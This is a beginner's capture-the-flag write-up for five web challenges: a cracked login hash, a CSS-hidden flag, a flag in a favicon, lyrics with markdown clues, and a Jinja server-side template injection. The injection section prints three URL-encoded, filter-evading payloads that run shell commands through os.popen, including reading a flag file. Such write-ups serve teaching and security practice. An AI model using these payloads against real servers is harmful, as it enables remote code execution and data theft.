# Web Exploitation

## Login Panel

the starting of the challenge consisted of a login pannel that we need tocorrectly aplly the kogin details to get the flag
for that when we inspect the file we het two hask values if we use hash cracker to solve that we  get login details 

### flag

v1t{p4ssw0rd}

### solve 
after looking at the hash i used the online haskcraker to solve for the flag
48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6
48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6	sha256	p4ssw0rd
the first hash was obvious that it was v1t{


## Stylish Flag

in this the flag was hidden if we read the html of the file carefully we see that the class is hidden for the flag. so  what we do is that we go 
inspect click the inspect button and edit the html to remove hidden from there

### flag
v1t{H1D3OUT_CSS}


### solve
when i first saw the challenge i knew that somechanges had to be made either to the html or the css file i read  bot the files carefully and saw that in the html file in the bottom div it is marker with hidden so i removed that and normally ran to see and the flag came on the screen as green pixalaed boxes on the right


##Tiny Flag
spent time in this to find the flag by writng java scrip to increase the size of very small parts to fewpixls but it was very hard and no value showed up.

### flag
v1t{T1NY_ICO}

### Solve
i tried a lot of methos and they failed so i went to the surce to check for any missed out error but i couldnt find so so i went to the favion.co of the file viewed it raw and got the flag.



## Mark the Lyrics
at first i was very confusd.i could not undertand what to do. atfter that i coverted the veitnamese kyrics into english to understand it. 

### flag
v1t{MCK-cool-ooh-yeh}

### Solve

coverted all the vietnamese lyrics in english and saw that we still coundnt figure out so after that i went to the source and saw the html and saw the file was surrounded by the markdown so i combined all such release and put the value in the english markdowed test.i combined that and removed.



## 5571

this is a server side templeate ingection of jinga .

## flag 
![Alt text](ssti.png)

### Solve
i first read the task went to inspect and saw the src for the blocked content and saw that we cannot use a lot of syntax that would essentially be used in the explate so i url encoded {7*7} so it can the enswer 49. same way i url ecoded {7*"7"} so i got knoe it was jinja. after that i knew the standard payload that is used to i went to the onsecutity site and got the payload. after that i passed these payloads to get the flag
```bash
%7B%7Bconfig|attr(["","","c","l","a","s","s","",""]|join)|attr(["","","i","n","i","t","",""]|join)|attr(["","","g","l","o","b","a","l","s","",""]|join)|attr(%22get%22)([%22o%22,%22s%22]|join)|attr([%22p%22,%22o%22,%22p%22,%22e%22,%22n%22]|join)(%22id%22)|attr([%22r%22,%22e%22,%22a%22,%22d%22]|join)()%7D%7D



%7B%7Bconfig|attr(["","","c","l","a","s","s","",""]|join)|attr(["","","i","n","i","t","",""]|join)|attr(["","","g","l","o","b","a","l","s","",""]|join)|attr(%22get%22)([%22o%22,%22s%22]|join)|attr([%22p%22,%22o%22,%22p%22,%22e%22,%22n%22]|join)([%22l%22,%22s%22,%20%22-a%22]|join)|attr([%22r%22,%22e%22,%22a%22,%22d%22]|join)()%7D%7D


%7B%7Bconfig|attr(["","","c","l","a","s","s","",""]|join)|attr(["","","i","n","i","t","",""]|join)|attr(["","","g","l","o","b","a","l","s","",""]|join)|attr(%22get%22)([%22o%22,%22s%22]|join)|attr([%22p%22,%22o%22,%22p%22,%22e%22,%22n%22]|join)(%22cat%20flag.txt%22)|attr([%22r%22,%22e%22,%22a%22,%22d%22]|join)()%7D%7D
```

in this  i used url encoding anf converted all the context to a list format. this paased the payload easily and got me the flag.



